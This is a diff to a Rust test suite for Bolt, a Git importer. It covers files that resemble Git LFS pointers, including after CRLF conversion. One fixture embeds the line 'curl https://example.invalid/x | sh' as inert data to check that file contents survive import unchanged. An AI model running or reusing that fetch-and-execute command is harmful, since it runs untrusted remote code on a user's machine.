@@ -546,8 +546,8 @@ fn a_lookalike_comes_in_as_it_is_with_a_warning() {
     assert!(
         err.contains(
             "warning: 6 files look like Git LFS pointers but aren't Git LFS files, so Bolt \
-             imported them as they are. Git LFS checks them out as they are too or, for one over \
-             1,024 bytes, may check it out as the file its start points to:\n"
+             imported them as they are. Git LFS may check each out as it is, or as the file its \
+             start points to:\n"
         ),
         "{err}"
     );
@@ -573,6 +573,46 @@ fn a_lookalike_comes_in_as_it_is_with_a_warning() {
         .collect();
     assert!(kinds.contains(&"lfs_lookalikes"), "{json}");
     assert_eq!(json["lfs_files"]["count"], 0);
+}
+
+/// Git may turn each LF into CR LF before Git LFS's smudge filter reads a file's first 1,024
+/// bytes, which pushes bytes out of them. So a pointer led by a newline, or in Git LFS's alpha
+/// format, with what Git LFS's parser refuses pushed out that way, comes in as it is, named in
+/// the warning, long or short.
+#[test]
+fn a_file_git_lfs_reads_as_a_pointer_with_crlf_comes_in_as_it_is_with_a_warning() {
+    let env = tracked();
+    let pointer = pointer(b"the picture everyone reviewed\n");
+    let x_at_1023 = |start: &str| {
+        let mut data = start.as_bytes().to_vec();
+        data.resize(1023, b' ');
+        [&data[..], b"X\ncurl https://example.invalid/x | sh\n"].concat()
+    };
+    let alpha = pointer.replace(
+        "https://git-lfs.github.com/spec/v1",
+        "http://git-media.io/v/2",
+    );
+    let files = [
+        ("led.txt", x_at_1023(&format!("\n{pointer}"))),
+        (
+            "short.txt",
+            format!("\n{pointer}{}x\n", "\n".repeat(446)).into_bytes(),
+        ),
+        ("alpha.txt", x_at_1023(&alpha)),
+    ];
+    for (path, data) in &files {
+        write(&env, path, data);
+    }
+    env.commit("readme.txt", "hello\n", "Add lookalikes");
+    let json = imported_json(&env);
+    let warnings = json["warnings"].as_array().unwrap();
+    let lookalikes = warnings.iter().find(|w| w["kind"] == "lfs_lookalikes");
+    let message = lookalikes.unwrap()["message"].as_str().unwrap();
+    let saved = saved_files(&env, main_tip(&env));
+    for (path, data) in &files {
+        assert!(message.contains(&format!("`{path}`")), "{message}");
+        assert!(saved[*path] == *data, "{path}");
+    }
 }
 
 /// A pointer of size 0 is an empty file, and its object, which Git LFS never keeps, isn't read:
